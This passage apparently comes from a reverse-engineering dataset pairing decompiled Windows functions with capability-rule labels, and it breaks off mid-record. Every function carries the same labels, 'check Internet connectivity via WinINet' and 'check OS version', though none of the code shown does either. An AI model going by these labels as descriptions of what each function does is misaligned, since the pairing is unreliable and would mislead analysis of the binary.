        "decompiled_code": "\nuint * __cdecl fcn.00039fe0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *var_8h;\n    uint var_4h;\n    \n    if (arg_ch == 0) {\n        fcn.00037150(0xb1c5b48c, &var_4h, 0);\n    }\n    for (var_8h = *0xb1c5b49c; (var_8h != NULL && (var_8h[5] != arg_8h)); var_8h = *var_8h) {\n    }\n    if (arg_ch == 0) {\n        fcn.00037180(0xb1c5b48c, &var_4h, 0);\n    }\n    return var_8h;\n}\n",
        "token_count": 181
    },
    "0003a050": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0003a050(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint *arg_8h_00;\n    int32_t iVar1;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    arg_8h_00 = fcn.00035230(0x1c);\n    if (arg_8h_00 == NULL) {\n        var_4h = -0x3fffff66;\n    }\n    else {\n        *arg_8h_00 = 0;\n        arg_8h_00[1] = 0;\n        arg_8h_00[2] = 0;\n        arg_8h_00[3] = 0;\n        arg_8h_00[4] = 0;\n        arg_8h_00[5] = 0;\n        arg_8h_00[6] = 0;\n        arg_8h_00[5] = arg_8h;\n        arg_8h_00[6] = arg_ch;\n        arg_8h_00[4] = arg_10h;\n        fcn.00037150(0xb1c5b48c, &var_8h, 1);\n        iVar1 = fcn.0003a120(arg_10h, 1);\n        if (iVar1 == 0) {\n            var_4h = -0x3fffff0f;\n        }\n        else {\n            arg_8h_00[1] = iVar1;\n            *arg_8h_00 = *0xb1c5b49c;\n            var_4h = 0;\n            *0xb1c5b49c = arg_8h_00;\n        }\n        fcn.00037180(0xb1c5b48c, &var_8h, 1);\n        if (var_4h != 0) {\n            fcn.00035330(arg_8h_00);\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 471
    },
    "0003a120": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0003a120(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *var_8h;\n    uint var_4h;\n    \n    if (arg_ch == 0) {\n        fcn.00037150(0xb1c5b48c, &var_4h, 0);\n    }\n    for (var_8h = *0xb1c5b498; (var_8h != NULL && (var_8h[1] != arg_8h)); var_8h = *var_8h) {\n    }\n    if (arg_ch == 0) {\n        fcn.00037180(0xb1c5b48c, &var_4h, 0);\n    }\n    return var_8h;\n}\n",
        "token_count": 180
    },
    "0003a190": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0003a190(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *var_8h;\n    uint var_4h;\n    \n    if (arg_ch == 0) {\n        fcn.00037150(0xb1c5b48c, &var_4h, 0);\n    }\n    for (var_8h = *0xb1c5b498; (var_8h != NULL && (var_8h[2] != arg_8h)); var_8h = *var_8h) {\n    }\n    if (arg_ch == 0) {\n        fcn.00037180(0xb1c5b48c, &var_4h, 0);\n    }\n    return var_8h;\n}\n",
        "token_count": 180
    },
    "0003a200": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0003a200(int32_t arg_8h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = fcn.00035230(0x1c);\n    if (puVar1 == NULL) {\n        uVar2 = 0xc000009a;\n    }\n    else {\n        *puVar1 = 0;\n        puVar1[1] = 0;\n        puVar1[2] = 0;\n        puVar1[3] = 0;\n        puVar1[4] = 0;\n        puVar1[5] = 0;\n        puVar1[6] = 0;\n        puVar1[1] = arg_8h;\n        puVar1[2] = *(arg_8h + 0x10);\n        fcn.00037150(0xb1c5b48c, &var_4h, 1);\n        *puVar1 = *0xb1c5b498;\n        *0xb1c5b498 = puVar1;\n        fcn.00037180(0xb1c5b48c, &var_4h, 1);\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 297
    },
    "0003a290": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0003a290(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    uVar2 = *0xb1c5b4b0;\n    if (*0xb1c5b4b0 == 0) {\n        for (var_8h = 0;\n            (((uVar2 = *0xb1c5b4b0,  var_8h < 0x400 &&\n              (cVar1 = (**0xb1bde208)(arg_8h + var_8h),  uVar2 = *0xb1c5b4b0,  cVar1 != '\\0')) &&\n             (cVar1 = (**0xb1bde208)(arg_8h + 0x1c + var_8h),  uVar2 = *0xb1c5b4b0,  cVar1 != '\\0')) &&\n            ((*(arg_8h + var_8h) != -0x74 || (uVar2 = var_8h,  *(arg_8h + var_8h + 2) != 0x1c)))); var_8h = var_8h + 4)\n        {\n        }\n    }\n    *0xb1c5b4b0 = uVar2;\n    return uVar2;\n}\n",
        "token_count": 328
    },
    "0003a340": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.0003a340(void)\n\n{\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = 0;\n    var_4h = 0;\n    var_8h = 0;\n    var_10h = 0;\n    var_14h = 0;\n    var_ch = 0;\n    var_1ch = fcn.00034a80(0xb1be18ec, &var_20h);\n    if ((((((var_1ch == 0) && (var_1ch = fcn.0005c850(var_20h, 0xb1be1b00, &var_4h),  var_1ch == 0)) &&\n          (var_1ch = fcn.0005c850(var_20h, 0xb1be1ae4, &var_18h),  var_1ch == 0)) &&\n         ((var_1ch = fcn.0005c850(var_20h, 0xb1be1e90, &var_8h),  var_1ch == 0 &&\n          (var_1ch = fcn.0005c850(var_20h, 0xb1be1eb4, &var_ch),  var_1ch == 0)))) &&\n        ((var_1ch = fcn.0005c850(var_20h, 0xb1be1ecc, &var_10h),  var_1ch == 0 &&\n         ((var_1ch = fcn.0005c850(var_20h, 0xb1be1ee0, &var_14h),  var_1ch == 0 &&\n          (var_1ch = fcn.000631a0(var_18h, 0xb1c07f90, 0xb1c5b4d0),  var_1ch == 0)))))) &&\n       ((var_1ch = fcn.000631a0(var_4h, 0xb1c07f70, 0xb1c5b4d4),  var_1ch == 0 &&\n        ((var_1ch = fcn.000631a0(var_8h, 0xb1c08060, 0xb1c5b4d8),  var_1ch == 0 &&\n         (var_1ch = fcn.000631a0(var_ch, 0xb1c08030, 0xb1c5b4e4),  var_1ch == 0)))))) {\n        var_1ch = fcn.000631a0(var_10h, 0xb1c08000, 0xb1c5b4e8);\n    }\n    if (var_1ch != 0) {\n        fcn.0003a4f0();\n    }\n    return var_1ch;\n}\n",
        "token_count": 684
    },
    "0003a530": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0003a530(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    var_4h = NULL;\n    var_4h = fcn.00035230(0x18);\n    if (var_4h == NULL) {\n        var_ch = 0xc000009a;\n    }\n    else {\n        *var_4h = 0;\n        var_4h[1] = 0;\n        var_4h[2] = 0;\n        var_4h[3] = 0;\n        var_4h[4] = 0;\n        var_4h[5] = 0;\n        var_4h[3] = arg_8h + *0xb1c68420;\n        var_4h[4] = arg_8h + *0xb1c6846c;\n        var_4h[2] = arg_8h;\n        var_4h[1] = arg_ch;\n        fcn.00037150(0xb1c5b4c0, &var_8h, 1);\n        iVar1 = fcn.0001b770(0xb1c5b4f0, 0, 0);\n        if (iVar1 == 0) {\n            var_ch = 0x21590006;\n        }\n        else {\n            *var_4h = *0xb1c5b4cc;\n            *0xb1c5b4cc = var_4h;\n            var_ch = 0;\n        }\n        fcn.00037180(0xb1c5b4c0, &var_8h, 1);\n    }\n    return var_ch;\n}\n",
        "token_count": 403
    },
    "0003a600": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0003a600(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t var_44h;\n    int32_t *var_40h;\n    uint32_t var_3ch;\n    int32_t *var_38h;\n    uint32_t var_34h;\n    int32_t *var_30h;\n    uint32_t var_2ch;\n    int32_t *var_28h;\n    uint32_t var_24h;\n    int32_t *var_20h;\n    uint32_t var_1ch;\n    int32_t *var_18h;\n    uint *var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    var_14h = NULL;\n    iVar2 = fcn.0001b770(0xb1c5b4f0, 0, 0);\n    if (iVar2 == 0) {\n        return 0x21590006;\n    }\n    fcn.00037150(0xb1c5b4c0, &var_8h, 0);\n    var_4h = fcn.0003d9a0(arg_8h, 1, 0);\n    if (var_4h == 0) {\n        fcn.00037180(0xb1c5b4c0, &var_8h, 0);\n        return -0x3ffffff8;\n    }\n    var_14h = *(var_4h + 0x14);\n    var_ch = *(var_4h + 4);\n    fcn.00037180(0xb1c5b4c0, &var_8h, 0);\n    if (var_14h != NULL) {\n        return -0x3fffffdf;\n    }\n    var_14h = fcn.00035230(0x18);\n    if (var_14h == NULL) {\n        return -0x3fffff66;\n    }\n    *var_14h = 0;\n    var_14h[1] = 0;\n    var_14h[2] = 0;\n    var_14h[3] = 0;\n    var_14h[4] = 0;\n    var_14h[5] = 0;\n    iVar2 = *0xb1c68438;\n    if (var_ch == 0x14) {\n        iVar2 = *0xb1c683d8;\n    }\n    var_18h = arg_8h + iVar2;\n    if (*var_18h != 0) {\n        cVar1 = (**0xb1bde208)(*var_18h);\n        if (cVar1 == '\\0') {\n            var_10h = -0x3ffffffb;\n            goto code_r0x0003aa8c;\n        }\n        var_10h = fcn.000638e0(*var_18h, 0x30, 5, &var_1ch);\n        if ((var_10h != 0) || ((3 < var_1ch && (var_10h = fcn.000631a0(*var_18h, 0xb1c08340, var_14h),  var_10h != 0))))\n        goto code_r0x0003aa8c;\n    }\n    iVar2 = *0xb1c68440;\n    if (var_ch == 0x14) {\n        iVar2 = *0xb1c683e0;\n    }\n    var_20h = arg_8h + iVar2;\n    if (*var_20h != 0) {\n        cVar1 = (**0xb1bde208)(*var_20h);\n        if (cVar1 == '\\0') {\n            var_10h = -0x3ffffffb;\n            goto code_r0x0003aa8c;\n        }\n        var_10h = fcn.000638e0(*var_20h, 0x30, 5, &var_24h);\n        if ((var_10h != 0) ||\n           ((3 < var_24h && (var_10h = fcn.000631a0(*var_20h, 0xb1c08300, var_14h + 2),  var_10h != 0))))\n        goto code_r0x0003aa8c;\n    }\n    iVar2 = *0xb1c68444;\n    if (var_ch == 0x14) {\n        iVar2 = *0xb1c683e4;\n    }\n    var_28h = arg_8h + iVar2;\n    if (*var_28h != 0) {\n        cVar1 = (**0xb1bde208)(*var_28h);\n        if (cVar1 == '\\0') {\n            var_10h = -0x3ffffffb;\n            goto code_r0x0003aa8c;\n        }\n        var_10h = fcn.000638e0(*var_28h, 0x30, 5, &var_2ch);\n        if ((var_10h != 0) ||\n           ((3 < var_2ch && (var_10h = fcn.000631a0(*var_28h, 0xb1c083a0, var_14h + 3),  var_10h != 0))))\n        goto code_r0x0003aa8c;\n    }\n    iVar2 = *0xb1c68450;\n    if (var_ch == 0x14) {\n        iVar2 = *0xb1c683f0;\n    }\n    var_30h = arg_8h + iVar2;\n    if (*var_30h != 0) {\n        cVar1 = (**0xb1bde208)(*var_30h);\n        if (cVar1 == '\\0') {\n            var_10h = -0x3ffffffb;\n            goto code_r0x0003aa8c;\n        }\n        var_10h = fcn.000638e0(*var_30h, 0x30, 5, &var_34h);\n        if ((var_10h != 0) ||\n           ((3 < var_34h && (var_10h = fcn.000631a0(*var_30h, 0xb1c082e0, var_14h + 4),  var_10h != 0))))\n        goto code_r0x0003aa8c;\n    }\n    iVar2 = *0xb1c68464;\n    if (var_ch == 0x14) {\n        iVar2 = *0xb1c68404;\n    }\n    var_38h = arg_8h + iVar2;\n    if (*var_38h != 0) {\n        cVar1 = (**0xb1bde208)(*var_38h);\n        if (cVar1 == '\\0') {\n            var_10h = -0x3ffffffb;\n            goto code_r0x0003aa8c;\n        }\n        var_10h = fcn.000638e0(*var_38h, 0x30, 5, &var_3ch);\n        if ((var_10h != 0) ||\n           ((3 < var_3ch && (var_10h = fcn.000631a0(*var_38h, 0xb1c08280, var_14h + 5),  var_10h != 0))))\n        goto code_r0x0003aa8c;\n    }\n    iVar2 = *0xb1c6845c;\n    if (var_ch == 0x14) {\n        iVar2 = *0xb1c683fc;\n    }\n    var_40h = arg_8h + iVar2;\n    if (*var_40h != 0) {\n        cVar1 = (**0xb1bde208)(*var_40h);\n        if (cVar1 == '\\0') {\n            var_10h = -0x3ffffffb;\n            goto code_r0x0003aa8c;\n        }\n        var_10h = fcn.000638e0(*var_40h, 0x30, 5, &var_44h);\n        if ((var_10h != 0) ||\n           ((3 < var_44h && (var_10h = fcn.000631a0(*var_40h, 0xb1c08370, var_14h + 1),  var_10h != 0))))\n        goto code_r0x0003aa8c;\n    }\n    fcn.00037150(0xb1c5b4c0, &var_8h, 0);\n    var_4h = fcn.0003d9a0(arg_8h, 1, 0);\n    if (var_4h == 0) {\n        var_10h = -0x3ffffff8;\n    }\n    else {\n        *(var_4h + 0x14) = var_14h;\n        var_10h = 0;\n    }\n    fcn.00037180(0xb1c5b4c0, &var_8h, 0);\ncode_r0x0003aa8c:\n    if (var_10h != 0) {\n        fcn.000635f0(var_14h);\n        fcn.000635f0(var_14h + 2);\n        fcn.000635f0(var_14h + 3);\n        fcn.000635f0(var_14h + 4);\n        fcn.000635f0(var_14h + 5);\n        fcn.000635f0(var_14h + 1);\n        fcn.00035330(var_14h);\n    }\n    return var_10h;\n}\n",
        "token_count": 2219
    },
    "0003aaf0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0003aaf0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    var_4h = NULL;\n    var_ch = NULL;\n    if (arg_8h == 0) {\n        iVar1 = -0x3ffffff8;\n    }\n    else {\n        fcn.00037150(0xb1c5b4c0, &var_8h, 0);\n        var_4h = fcn.0003d9a0(arg_8h, 1, &var_ch);\n        if (var_4h != NULL) {\n            if (var_ch == NULL) {\n                *0xb1c5b4cc = *var_4h;\n            }\n            else {\n                *var_ch = *var_4h;\n            }\n        }\n        fcn.00037180(0xb1c5b4c0, &var_8h, 0);\n        if (var_4h != NULL) {\n            if (var_4h[5] != 0) {\n                fcn.000635f0(var_4h[5]);\n                fcn.000635f0(var_4h[5] + 8);\n                fcn.000635f0(var_4h[5] + 0xc);\n                fcn.000635f0(var_4h[5] + 0x10);\n                fcn.000635f0(var_4h[5] + 0x14);\n                fcn.000635f0(var_4h[5] + 4);\n                fcn.00035330(var_4h[5]);\n            }\n            fcn.00035330(var_4h);\n        }\n        iVar1 = (-(var_4h != NULL) & 0x3ffffff8) + 0xc0000008;\n    }\n    return iVar1;\n}\n",
        "token_count": 440
    },
    "0003ac10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nvoid fcn.0003ac10(void)\n\n{\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    while( true ) {\n        fcn.00037150(0xb1c5b4c0, &var_8h, 1);\n        var_4h = *0xb1c5b4cc;\n        if (*0xb1c5b4cc != 0) {\n            var_ch = *(*0xb1c5b4cc + 8);\n        }\n        fcn.00037180(0xb1c5b4c0, &var_8h, 1);\n        if (var_4h == 0) break;\n        fcn.0003aaf0(var_ch);\n    }\n    return;\n}\n",
        "token_count": 197
    },
    "0003ac80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0003ac80(int32_t arg_8h, int32_t arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (((arg_8h == 0) && (arg_ch == 0)) || ((arg_8h != 0 && (arg_ch != 0)))) {\n        var_ch = 0xc00000ef;\n    }\n    else {\n        if (arg_14h == 0) {\n            fcn.00037150(0xb1c5b4c0, &var_4h, 0);\n        }\n        if (arg_ch == 0) {\n            var_8h = fcn.0003d400(arg_8h, 0);\n        }\n        else {\n            var_8h = fcn.0003ad30(arg_ch, 0);\n        }\n        if (var_8h == 0) {\n            var_ch = 0xc000000d;\n        }\n        else {\n            *(var_8h + 0x470) = arg_10h;\n            var_ch = 0;\n        }\n        if (arg_14h == 0) {\n            fcn.00037180(0xb1c5b4c0, &var_4h, 0);\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 317
    },
    "0003ad30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0003ad30(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *var_8h;\n    uint var_4h;\n    \n    if (arg_ch == 0) {\n        fcn.00037150(0xb1c5b4c0, &var_4h, 0);\n    }\n    for (var_8h = *0xb1c5b4b8; (var_8h != NULL && (var_8h[0x116] != arg_8h)); var_8h = *var_8h) {\n    }\n    if (arg_ch == 0) {\n        fcn.00037180(0xb1c5b4c0, &var_4h, 0);\n    }\n    return var_8h;\n}\n",
        "token_count": 186
    },
    "0003ada0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nuint32_t __cdecl fcn.0003ada0(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int16_t iVar1;\n    bool bVar2;\n    char cVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    int32_t arg_ch_00;\n    uint32_t uVar6;\n    bool bVar7;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint *var_4h;\n    \n    var_ch = 0;\n    bVar7 = false;\n    bVar2 = false;\n    for (var_4h = *(arg_8h + 4); var_4h != NULL; var_4h = *var_4h) {\n        uVar6 = var_4h[3];\n        fcn.00057030(0);\n        iVar5 = fcn.00035230(uVar6);\n        if (iVar5 != 0) {\n            arg_ch_00 = (**0xb1c5b3f0)(var_4h, uVar6, iVar5, 0, 0);\n            if (arg_ch_00 == 0) {\n                fcn.00035330(iVar5);\n            }\n            else {\n                fcn.00037150(0xb1c5b4c0, &fcn.0003ada0::var_8h, 0);\n                iVar5 = fcn.0003d400(arg_ch, 1);\n                if (iVar5 != 0) {\n                    arg_ch = *(iVar5 + 4);\n                    fcn.0004d370(arg_ch, arg_ch_00, arg_ch_00 + 0xe, uVar6);\n                    if (*(iVar5 + 0x418) == 0) {\n                        var_ch = 0;\n                    }\n                    else {\n                        arg_ch = *(iVar5 + 0x418);\n                        var_ch = fcn.00063e80(arg_ch);\n                    }\n                }\n                var_4h = 0x3aeba;\n                fcn.00037180(0xb1c5b4c0, &fcn.0003ada0::var_8h, 0);\n                if (var_ch == 0) {\n                    var_10h = uVar6;\n                    if (0xd < uVar6) {\n                        iVar1 = *(arg_ch_00 + 0xc);\n                        var_4h = 0x7ff;\n                        var_8h = 0x3aedd;\n                        iVar4 = fcn.000354c0(0x7ff);\n                        if (iVar1 == iVar4) {\n                            var_ch = 1;\n                        }\n                    }\n                }\n                else {\n                    var_4h = NULL;\n                    var_8h = 0x3aef4;\n                    fcn.00057060(0);\n                    var_10h = arg_ch;\n                    var_8h = uVar6;\n                    fcn.0003e230(arg_ch, arg_ch_00, uVar6);\n                    var_ch = arg_ch_00;\n                }\n                cVar3 = fcn.0004f1b0(0, arg_ch, 0, 0, var_10h & 0xffff, var_10h & 0xffff, 0);\n                bVar7 = cVar3 == '\\0';\n                bVar2 = !bVar7;\n                fcn.00035330(0);\n            }\n        }\n    }\n    if ((bVar7) && (bVar2)) {\n        uVar6 = 0xffffffff;\n    }\n    else {\n        uVar6 = bVar7;\n    }\n    return uVar6;\n}\n",
        "token_count": 1017
    },
    "0003af90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl fcn.0003af90(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, uint arg_1ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint uVar3;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar3 = arg_ch;\n    iVar2 = arg_18h;\n    pcVar1 = fcn.000639f0(arg_8h);\n    iVar2 = (*pcVar1)(arg_8h, uVar3, arg_10h, arg_14h, iVar2, arg_1ch, 0);\n    if (iVar2 == 0) {\n        arg_8h_00 = (**0xb1bde20c)(arg_ch, 0x4e4d4944);\n        if (arg_8h_00 != 0) {\n            fcn.0003a530(arg_8h_00, *(arg_18h + 5));\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 276
    },
    "0003b030": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0003b030(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    uVar2 = arg_ch;\n    iVar3 = arg_10h;\n    pcVar1 = fcn.000639f0(arg_8h);\n    (*pcVar1)(arg_8h, uVar2, iVar3);\n    if (arg_10h == 0) {\n        fcn.0003ac80(arg_ch, 0, 0, 0);\n    }\n    return;\n}\n",
        "token_count": 141
    },
    "0003b060": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0003b060(uint arg_8h, int32_t arg_ch, uint *arg_10h, uint arg_14h, uint32_t arg_18h, uint32_t arg_1ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint *var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint *var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    var_10h = 0;\n    var_14h = NULL;\n    var_20h = 0;\n    var_1ch = 0;\n    if (((arg_18h == 0) || (arg_ch == 0)) || (arg_10h == NULL)) {\n        pcVar2 = fcn.000639f0(arg_8h);\n        (*pcVar2)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch);\n    }\n    else {\n        fcn.00037150(0xb1c5b4c0, &var_4h, 0);\n        iVar3 = fcn.0003d400(arg_ch, 1);\n        if (((iVar3 != 0) && (*(iVar3 + 0x460) != 0)) && (*(*(iVar3 + 0x460) + 0x14) != 0)) {\n            var_1ch = *(iVar3 + 0x458);\n            var_20h = *(*(*(iVar3 + 0x460) + 0x14) + 0x10);\n        }\n        fcn.00037180(0xb1c5b4c0, &var_4h, 0);\n        if (var_20h == 0) {\n            var_10h = arg_18h;\n            var_14h = arg_10h;\n        }\n        else {\n            var_28h = 0;\n            var_24h = NULL;\n            for (var_8h = arg_10h; (var_28h < arg_18h && (var_8h != NULL)); var_8h = *var_8h) {\n                iVar3 = fcn.0003ada0(var_8h, arg_ch);\n                if (iVar3 == 0) {\n                    if (var_14h == NULL) {\n                        var_14h = var_8h;\n                    }\n                    var_10h = var_10h + 1;\n                    var_24h = var_8h;\n                }\n                else {\n                    if (var_10h != 0) {\n                        *var_24h = 0;\n                        uVar5 = arg_8h;\n                        iVar3 = arg_ch;\n                        uVar6 = arg_14h;\n                        uVar4 = arg_1ch;\n                        pcVar2 = fcn.000639f0(arg_8h);\n                        (*pcVar2)(uVar5, iVar3, var_14h, uVar6, var_10h, uVar4);\n                        *var_24h = var_8h;\n                    }\n                    if (((arg_1ch & 2) == 0) && (var_1ch != 0)) {\n                        uVar5 = *var_8h;\n                        *var_8h = 0;\n                        cVar1 = (**0xb1bde004)();\n                        uVar4 = cVar1 == '\\x02';\n                        iVar3 = var_20h;\n                        iVar7 = var_1ch;\n                        puVar8 = var_8h;\n                        pcVar2 = fcn.000639f0(var_20h);\n                        (*pcVar2)(iVar3, iVar7, puVar8, uVar4);\n                        *var_8h = uVar5;\n                    }\n                    var_10h = 0;\n                    var_14h = NULL;\n                }\n                var_28h = var_28h + 1;\n            }\n        }\n        if (var_10h != 0) {\n            pcVar2 = fcn.000639f0(arg_8h);\n            (*pcVar2)(arg_8h, arg_ch, var_14h, arg_14h, var_10h, arg_1ch);\n        }\n    }\n    return;\n}\n",
        "token_count": 1038
    },
    "0003b280": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
